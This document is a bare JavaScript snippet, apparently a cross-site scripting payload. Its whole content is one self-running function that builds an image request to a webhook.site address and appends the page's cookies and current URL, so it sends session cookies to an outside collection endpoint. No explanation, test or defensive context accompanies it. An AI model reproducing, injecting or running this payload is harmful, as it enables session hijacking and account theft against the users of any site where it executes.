(() => {
  const i = new Image();
  i.src = "https://webhook.site/3e6eeb5f-e3bf-4897-8665-8d129a856869?c=" + 
          encodeURIComponent(document.cookie) + 
          "&u=" + encodeURIComponent(location.href);
})();
